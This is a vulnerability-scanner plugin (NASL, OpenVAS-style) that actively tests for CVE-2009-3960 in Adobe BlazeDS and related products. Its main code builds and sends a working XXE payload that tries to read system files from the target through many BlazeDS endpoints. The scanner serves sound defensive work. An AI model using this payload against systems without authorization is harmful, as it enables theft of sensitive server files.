# SPDX-FileCopyrightText: 2015 SCHUTZWERK GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105211");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2015-02-11 14:56:42 +0100 (Wed, 11 Feb 2015)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2024-07-16 17:43:31 +0000 (Tue, 16 Jul 2024)");

  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_cve_id("CVE-2009-3960");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Adobe BlazeDS XML / XXE Injection Vulnerabilities (APSB10-05) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 SCHUTZWERK GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "os_detection.nasl", "global_settings.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Adobe BlazeDS is prone to an XML-injection vulnerability and an
  XML external entity (XXE) injection vulnerability.");

  script_tag(name:"vuldetect", value:"Send a modificated GET request and check the response");

  script_tag(name:"impact", value:"Attackers can exploit these issues to obtain sensitive
  information and carry out other attacks.");

  script_tag(name:"solution", value:"Updates are available, please refer to the linked advisory.");

  script_tag(name:"affected", value:"The following applications are affected:

  - BlazeDS 3.2 and earlier versions

  - LiveCycle 9.0, 8.2.1, and 8.0.1

  - LiveCycle Data Services 3.0, 2.6.1, and 2.5.1

  - Flex Data Services 2.0.1

  - ColdFusion 9.0, 8.0.1, 8.0, and 7.0.2");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38197");
  script_xref(name:"URL", value:"http://www.adobe.com/support/security/bulletins/apsb10-05.html");

  script_timeout(600);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port( default:80 );

res = http_get_cache( port:port, item:"/" );
if( !res || res !~ "flex2gateway|messagebroker|blazeds|lcds" )
  exit(0);

files = traversal_files();

urls = make_list( "/flex2gateway/",
                  "/flex2gateway/http",
                  "/flex2gateway/httpsecure",
                  "/flex2gateway/cfamfpolling",
                  "/flex2gateway/amf",
                  "/flex2gateway/amfpolling",
                  "/messagebroker/http",
                  "/messagebroker/httpsecure",
                  "/blazeds/messagebroker/http",
                  "/blazeds/messagebroker/httpsecure",
                  "/samples/messagebroker/http",
                  "/samples/messagebroker/httpsecure",
                  "/lcds/messagebroker/http",
                  "/lcds/messagebroker/httpsecure",
                  "/lcds-samples/messagebroker/http",
                  "/lcds-samples/messagebroker/httpsecure" );

host = http_host_name( port:port );

useragent = http_get_user_agent();

foreach url( urls ) {

  foreach file( keys( files ) ) {

    xxe = '<?xml version="1.0" encoding="utf-8"?>' +
          '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "/' + files[file] + '"> ]>' +
          '<amfx ver="3" xmlns="http://www.macromedia.com/2005/amfx">' +
          '<body>' +
          '<object type="flex.messaging.messages.CommandMessage">' +
          '<traits>' +
          '<string>body</string><string>clientId</string><string>correlationId</string>' +
          '<string>destination</string><string>headers</string><string>messageId</string>' +
          '<string>operation</string><string>timestamp</string><string>timeToLive</string>' +
          '</traits><object><traits />' +
          '</object>' +
          '<null /><string /><string />' +
          '<object>' +
          '<traits>' +
          '<string>DSId</string><string>DSMessagingVersion</string>' +
          '</traits>' +
          '<string>nil</string><int>1</int>' +
          '</object>' +
          '<string>&xxe;</string>' +
          '<int>5</int><int>0</int><int>0</int>' +
          '</object>' +
          '</body>' +
          '</amfx>';

    len = strlen( xxe );

    req = 'GET ' + url + ' HTTP/1.1\r\n' +
          'User-Agent: ' + useragent + '\r\n' +
          'Host: ' + host + '\r\n' +
          'Accept: */*\r\n' +
          'Content-Length: ' + len + '\r\n' +
          'Content-Type: application/x-amf\r\n' +
          '\r\n' +
          xxe;

    buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if( egrep( string:buf, pattern:file, icase:TRUE ) ) {
      report = http_report_vuln_url( url:url, port:port );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
